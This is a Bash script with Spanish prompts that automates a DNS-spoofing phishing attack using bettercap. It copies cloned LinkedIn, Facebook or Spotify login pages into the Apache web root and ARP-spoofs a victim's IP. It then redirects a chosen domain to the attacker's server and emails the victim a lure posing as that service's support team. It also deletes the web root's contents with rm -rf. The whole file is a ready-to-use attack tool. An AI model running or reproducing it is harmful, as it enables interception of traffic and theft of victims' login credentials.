#!/bin/bash

# Función para mostrar el menú por pantalla
mostrar_menu() {
    echo "Bienvenido al menú de opciones:"
    echo "1. Activar net.probe"
    echo "2. Mostrar Dispositivos en red"
    echo "3. Ataque DNS SPOFFING"
    echo "4. Salir"
}

# Función para activar net.probe
activar_net_probe() {
    echo "Activando net.probe..."
    bettercap -eval 'net.probe on'
    sleep 1
    echo "Activando netporbe.on ...."
    # Agregar aquí el comando para activar net.probe
}
activar_ticker_on() {
    echo "Activando ticker on..."
    sleep 2
    bettercap -script lanzar.js
    echo "exit para salir"
    }
iniciar_ataque() {
    echo "Introdce el numero de la pagina a suplantar: "
    echo "1; Linkedin 2; Facebook 3; Spotify"
    read pagina
    if [ $pagina -eq 1 ]; then
    cp -r /home/alexz/linkedin/* /var/www/html/  
    elif [ $pagina -eq 2 ]; then
    cp-r /home/alexz/facebook/* /var/www/html/
    elif [ $pagina -eq 3 ]; then
    cp -r /home/alexz/spotify/* /var/www/html/
    fi
   
    ########################################
    echo "Introduce la IP de la maquina victima:"
    read ip_victima
    var1="var1"
    frase1="set arp.spoof targets var1 "
    frase_mod1="${frase1//$var1/$ip_victima}"
    echo "$frase_mod1" >> ataquedns.cap
    echo "arp.spoof on" >> ataquedns.cap
    #########################################
    echo "Introduce la pagina que quieres suplantar ejemplo:(wikipedia.com)...."
    read pagina_sup
    var2="var2"
    frase2="set dns.spoof.domains var2 "
    frase_mod2="${frase2//$var2/$pagina_sup}"
    echo "$frase_mod2" >> ataquedns.cap
    #########################################
    echo "Introduce la IP de la maquina con Apache2/XAMPP:"
    read ip_supl
    var3="var3"
    frase3="set dns.spoof.address var3 "
    frase_mod3="${frase3//$var3/$ip_supl}"
    echo "$frase_mod3" >> ataquedns.cap
    echo "dns.spoof on" >> ataquedns.cap
    ########################################
   
    echo "Introduce el correo de la victima"
    read correo
    if [ $pagina -eq 1 ]; then
    echo "Entra y no te pierdas las novedades!" $pagina_sup | mail -s "Soporte de Linkedin" $correo
    elif [ $pagina -eq 2 ]; then
    echo "Entra y no te pierdas las novedades!" $pagina_sup| mail -s "Soporte de Facebook" $correo
    elif [ $pagina -eq 3 ]; then
    echo "Entra y no te pierdas las novedades!" $pagina_sup | mail -s "Soporte de Spotify" $correo
    fi

  sudo bettercap -caplet ataquedns.cap
   
}
# Loop principal del programa
echo -n ""> /home/alexz/scripts/ataquedns.cap
rm -rf /var/www/html/* 2>/dev/null
while true; do
    # Mostrar el menú
    mostrar_menu

    # Pedir al usuario que elija una opción
    read -p "Seleccione una opción: " opcion

    # Ejecutar la opción seleccionada
    case $opcion in
        1)
            activar_net_probe
            ;;
        2)
            activar_ticker_on
            ;;
        3)
            iniciar_ataque
            ;;
        4)
            echo "Saliendo del script..."
            exit 0
            ;;
        *)
            echo "Opción inválida."
            ;;
    esac
done


